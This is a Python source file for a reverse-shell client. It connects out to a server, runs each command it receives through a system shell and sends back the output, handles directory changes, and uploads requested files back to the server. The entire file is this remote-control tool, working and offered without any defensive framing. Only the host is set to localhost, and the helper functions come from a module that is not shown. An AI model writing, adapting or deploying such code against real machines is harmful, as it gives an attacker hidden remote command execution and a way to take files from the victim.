import os
import socket
import subprocess

from utils import handle_cd, download_file


def start_client():
    host = '127.0.0.1'
    port = 12344

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((host, port))

        client_socket.sendall(os.getcwd().encode('utf-8'))

        while True:
            # Receive command from the server
            command = client_socket.recv(4096).decode('utf-8')

            if command.lower() == 'exit':
                break
            elif command.lower().startswith('download'):
                # Extracting filename from the command
                _, filepath = command.split(' ', 1)
                print(f"receive filepath {filepath}")

                if download_file(client_socket, filepath=filepath):
                    continue
                else:
                    client_socket.sendall('%-> File not found'.encode("utf-8"))

            cd_result = handle_cd(command)
            if cd_result:
                client_socket.sendall(cd_result.encode('utf-8'))
                continue

            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)

                # Handel if the command return nothing
                if result.stdout == "":
                    client_socket.sendall("Null".encode('utf-8'))
                    continue

                # Send the result back to the server
                client_socket.sendall(result.stdout.encode('utf-8'))

            except Exception as e:
                # Send any errors back to the server
                client_socket.sendall(str(e).encode('utf-8'))


if __name__ == "__main__":
    start_client()
